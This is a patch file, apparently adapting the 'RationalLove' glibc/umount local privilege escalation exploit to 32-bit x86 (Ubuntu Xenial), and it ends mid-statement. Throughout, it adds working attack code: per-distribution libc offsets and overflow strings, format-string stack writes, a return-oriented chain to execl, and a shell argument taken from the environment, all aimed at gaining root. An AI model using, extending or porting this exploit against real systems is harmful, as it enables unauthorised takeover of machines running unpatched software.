@@ -1,0 +1,232 @@
+diff --git a/RationalLove.c b/RationalLove.c
+index 9b354cd..66cceb4 100644
+--- a/RationalLove.c
++++ b/RationalLove.c
+@@ -107,12 +107,23 @@ char *osRelease=NULL;
+ #define ED_STACK_OFFSET_ARGV 1
+ // Format string argument skipping for argv[0].
+ #define ED_STACK_OFFSET_ARG0 2
++#ifdef __x86_64__
+ // Delta of getdate() function from __libc_start_main position
+ // after return from main().
+ #define ED_LIBC_GETDATE_DELTA 3
+ // Delta of execl() function from __libc_start_main ...
+ #define ED_LIBC_EXECL_DELTA 4
++#elif __i386__
++// Shell string in env[0]
++#define ED_STACK_OFFSET_ENV0 3
++// Delta of ropchain to "ret" from __libc_start_main position
++// after return from main().
++#define ED_LIBC_ROPTORET_DELTA 4
++// Delta of execl() function from __libc_start_main ...
++#define ED_LIBC_EXECL_DELTA 5
++#endif
+ static char* osSpecificExploitDataList[]={
++#ifdef __x86_64__
+ // Debian Stretch
+     "\"9 (stretch)\"",
+     "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A",
+@@ -129,6 +140,14 @@ static char* osSpecificExploitDataList[]={
+     "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A",
+     "_nl_load_locale_from_archive",
+     "\x07\0\0\0\x26\0\0\0\x40\0\0\0\xd0\xf5\x09\x00\xf0\xc1\x0a\x00",
++#elif __i386__
++    "\x04\x00\x00\x00\x3c\x00\x00\x00\x60\x00\x00\x00\x77\x00\x00\x00\x68\xda\x00\x00\x9d\xdb\x09\x00",
++// Ubuntu Xenial libc=2.23-0ubuntu9
++    "\"16.04.3 LTS (Xenial Xerus)\"",
++    "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
++    "n V",
++    "\x04\x00\x00\x00\x3c\x00\x00\x00\x60\x00\x00\x00\x77\x00\x00\x00\x0a\xc5\x00\x00\x49\x84\x09\x00",
++#endif
+     NULL};
+ 
+ char **osReleaseExploitData=NULL;
+@@ -240,9 +259,9 @@ char* createMessageCatalogueData(char **origStringList, char **transStringList,
+   preambleData++;
+   *preambleData++=stringCount+1;
+   *preambleData++=0x1c;
+-  *preambleData++=(*(preambleData-2))+(stringCount+1)*sizeof(int)*2;
++  *preambleData++=(catalogueData[sizeof(int)*3])+(stringCount+1)*sizeof(int)*2;
+   *preambleData++=0x5;
+-  *preambleData++=(*(preambleData-3))+(stringCount+1)*sizeof(int)*2;
++  *preambleData++=(catalogueData[sizeof(int)*4])+(stringCount+1)*sizeof(int)*2;
+ 
+   char *nextCatalogueStringStart=catalogueData+preambleLength;
+   for(int stringPos=-1; stringPos<stringCount; stringPos++) {
+@@ -448,11 +467,20 @@ pid_t prepareNamespacedProcess() {
+   char *stackDumpStr=(char*)malloc(0x80+6*(STACK_LONG_DUMP_BYTES/8));
+   assert(stackDumpStr);
+   char *stackDumpStrEnd=stackDumpStr;
++#ifdef __x86_64__
+   stackDumpStrEnd+=sprintf(stackDumpStrEnd, "AA%%%d$lnAAAAAA",
++#elif __i386__
++  stackDumpStrEnd+=sprintf(stackDumpStrEnd, "AA%%%d$llnAA",
++#endif
+       ((int*)osReleaseExploitData[3])[ED_STACK_OFFSET_CTX]);
+   for(int dumpCount=(STACK_LONG_DUMP_BYTES/8); dumpCount; dumpCount--) {
++#ifdef __x86_64__
+     memcpy(stackDumpStrEnd, "%016lx", 6);
+     stackDumpStrEnd+=6;
++#elif __i386__
++    memcpy(stackDumpStrEnd, "%08x", 4);
++    stackDumpStrEnd+=4;
++#endif
+   }
+ // We wrote allready 8 bytes, write so many more to produce a
+ // count of 'L' and write that to the stack. As all writes so
+@@ -462,7 +490,11 @@ pid_t prepareNamespacedProcess() {
+ // here. The target write address has a 16 byte alignment due
+ // to varg structure.
+   stackDumpStrEnd+=sprintf(stackDumpStrEnd, "%%1$%dhhx%%%d$hhn",
++#ifdef __x86_64__
+       ('L'-8-STACK_LONG_DUMP_BYTES*2)&0xff,
++#elif __i386__
++      ('L'-4-STACK_LONG_DUMP_BYTES*2)&0xff,
++#endif
+       STACK_LONG_DUMP_BYTES/16);
+   *stackDumpStrEnd=0;
+   result=writeMessageCatalogue(pathBuffer,
+@@ -566,15 +598,23 @@ void createStackWriteFormatString(
+ // Write the LABEL 6 more times, thus multiplying the the single
+ // byte write pointer to an 8-byte aligned argv-list pointer and
+ // update argv[0] to point to argv[1..n].
++#ifdef __x86_64__
+   writeCount=(((long long)argvStackAddress)-(writeCount+56))&0xffff;
++#elif __i386__
++  writeCount=(((long long)argvStackAddress)-(writeCount+28))&0xffff;
++#endif
+   result=snprintf(formatBuffer, bufferSize,
++#ifdef __x86_64__
+       "%%1$s%%1$s%%1$s%%1$s%%1$s%%1$s%%1$%d.%ds%%%d$hn",
++#elif __i386__
++      "%%1$s%%1$s%%1$%d.%ds%%%d$hn",
++#endif
+       writeCount, writeCount, printfArgvValuePos);
+   formatBuffer+=result;
+   bufferSize-=result;
+ 
+ // Append a debugging preamble.
+-  result=snprintf(formatBuffer, bufferSize, "-%%35$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%78$s\n",
++  result=snprintf(formatBuffer, bufferSize, "-%%35$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%78$lx\n",
+       printfArgvValuePos, printfArg0ValuePos-1, printfArg0ValuePos,
+       printfArg0ValuePos+1, printfArg0ValuePos+2, printfArg0ValuePos+3,
+       printfArg0ValuePos+4, printfArg0ValuePos+5, printfArg0ValuePos+6);
+@@ -646,6 +686,10 @@ int attemptEscalation() {
+     while(envCount>=0) {
+       umountEnv[envCount--]="AANGUAGE=X.X";
+     }
++#ifdef __i386__
++// DATEMSK must exist in the current directory after call 'chdir(targetCwd)'
++    umountEnv[0]="./DATEMSK";
++#endif
+ // Use the built-in C locale.
+ // Invoke umount first by overwriting heap downwards using links
+ // for "down", then retriggering another error message ("busy")
+@@ -653,7 +697,20 @@ int attemptEscalation() {
+ // The path "/" cannot be used as it is registered in "/run/mount/utab"
+ // on standard desktop Xenial installs, thus triggering different
+ // code path.
+-    char* umountArgs[]={umountPathname, "/run", "/run", "/run", "/run", "/run", "/run", "/run", "/run", "/run", "/run", "down", "LABEL=78", "LABEL=789", "LABEL=789a", "LABEL=789ab", "LABEL=789abc", "LABEL=789abcd", "LABEL=789abcde", "LABEL=789abcdef", "LABEL=789abcdef0", "LABEL=789abcdef0", NULL};
++    char* umountArgs[]={umountPathname, "/run", "/run", "/run", "/run", "/run", "/run", "/run", "/run", "/run", "/run", "down", "LABEL=78", "LABEL=789", "LABEL=789a", "LABEL=789ab", "LABEL=789abc",
++#ifdef __x86_64__
++    "LABEL=789abcd", "LABEL=789abcde",
++#elif __i386__
++    // "LABEL=789abcd", "LABEL=789abcde",
++    // Skip these LABEL's. The concatenation of these LABEL's points to the (char**)argv.
++#endif
++    "LABEL=789abcdef", "LABEL=789abcdef0",
++#ifdef __x86_64__
++    "LABEL=789abcdef0",
++#elif __i386__
++    "LABEL=789abcdef01", "LABEL=789abcdef012", "LABEL=789abcdef012",
++#endif
++    NULL};
+     result=execve(umountArgs[0], umountArgs, umountEnv);
+     assert(!result);
+   }
+@@ -663,7 +720,11 @@ int attemptEscalation() {
+   int escalationPhase=0;
+   char readBuffer[1024];
+   int readDataLength=0;
++#ifdef __x86_64__
+   char stackData[STACK_LONG_DUMP_BYTES];
++#elif __i386__
++  char stackData[STACK_LONG_DUMP_BYTES / 2];
++#endif
+   int stackDataBytes=0;
+ 
+   struct pollfd pollFdList[1];
+@@ -731,7 +792,11 @@ int attemptEscalation() {
+           if(readDataLength<8)
+             continue;
+           char *preambleStart=memmem(readBuffer, readDataLength,
++#ifdef __x86_64__
+               "AAAAAAAA", 8);
++#elif __i386__
++              "AAAA", 4);
++#endif
+           if(!preambleStart) {
+ // No preamble, move content only if buffer is full.
+             if(readDataLength==sizeof(readBuffer))
+@@ -740,11 +805,20 @@ int attemptEscalation() {
+           }
+ // We found, what we are looking for. Start reading the stack.
+           escalationPhase++;
++#ifdef __x86_64__
+           moveLength=preambleStart-readBuffer+8;
++#elif __i386__
++          moveLength=preambleStart-readBuffer+4;
++#endif
+         case 1: // Read the stack.
+ // Consume stack data until or local array is full.
++#ifdef __x86_64__
+           while(moveLength+16<=readDataLength) {
+             result=sscanf(readBuffer+moveLength, "%016lx",
++#elif __i386__
++          while(moveLength+8<=readDataLength) {
++            result=sscanf(readBuffer+moveLength, "%08x",
++#endif
+                 (long*)(stackData+stackDataBytes));
+             if(result!=1) {
+ // Scanning failed, the data injection procedure apparently did
+@@ -768,22 +842,40 @@ int attemptEscalation() {
+ // This is the address, where source Pointer is pointing to.
+           void *sourcePointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]];
+ // This is the stack address source for the target pointer.
++#ifdef __x86_64__
+           void *sourcePointerLocation=sourcePointerTarget-0xd0;
++#elif __i386__
++          void *sourcePointerLocation=sourcePointerTarget-0x90;
++#endif
+ 
+           void *targetPointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARG0]];
+ // This is the stack address of the libc start function return
+ // pointer.
++#ifdef __x86_64__
+           void *libcStartFunctionReturnAddressSource=sourcePointerLocation-0x10;
++#elif __i386__
++          void *libcStartFunctionReturnAddressSource=sourcePointerLocation-0x8;
++#endif
+           fprintf(stderr, "Found source address location %p pointing to target address %p with value %p, libc offset is %p\n",
+               sourcePointerLocation, sourcePointerTarget,
+               targetPointerTarget, libcStartFunctionReturnAddressSource);
++#ifdef __i386__
++          void *shellCStrArg = ((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ENV0]];
++          fprintf(stderr, "Found address env[0] with value %p\n", shellCStrArg);
++#endif
+ // So the libcStartFunctionReturnAddressSource is the lowest address
+ // to manipulate, targetPointerTarget+...
+ 
+           void *libcStartFunctionAddress=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]-2];
+           void *stackWriteData[]={
++#ifdef __x86_64__
+               libcStartFunctionAddress+exploitOffsets[ED_LIBC_GETDATE_DELTA],
+               libcStartFunctionAddress+exploitOffsets[ED_LIBC_EXECL_DELTA]
++#elif __i386__
++              libcStartFunctionAddress+exploitOffsets[ED_LIBC_ROPTORET_DELTA],
++              libcStartFunctionAddress+exploitOffsets[ED_LIBC_EXECL_DELTA],
++              shellCStrArg, shellCStrArg, (void*)0
++#endif
+           };
+           fprintf(stderr, "Changing return address from %p to %p, %p\n",
+               libcStartFunctionAddress, stackWriteData[0],
